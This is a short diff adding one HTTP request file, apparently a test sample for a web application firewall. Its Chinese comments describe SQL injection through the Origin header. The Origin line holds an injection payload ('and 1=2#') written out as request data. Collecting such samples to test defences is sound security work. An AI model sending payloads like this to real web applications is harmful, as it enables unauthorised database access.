@@ -1,0 +1,10 @@
+# SQL注入_GET_通用_请求头注入_Origin-06506502
+# 基于请求头注入，在http请求的Origin头部中注入恶意代码，可能尝试利用应用程序的语言处理功能的漏洞，以绕过安全检查并执行恶意的SQL查询。该注入语句在注入点之后使用了单引号 ' ，然后插入了“1 and 1=2”，这是一个始终为假的条件。通过这个注入语句攻击者试图绕过应用程序的安全机制并执行恶意操作。
+GET /?bid=hd_tag_m8mv26dj HTTP/1.1
+Host: www.swaf.com
+Origin: http://127.0.0.1' and 1=2#
+RM-PRO-BusinessID: hd_tag_m8mv26dj
+RM-PRO-Token: b85ca8cc1762b397c26c204b7a84f309
+RM-PRO-Time: 1742808583371
+User-Agent: curl/7.83.1
+
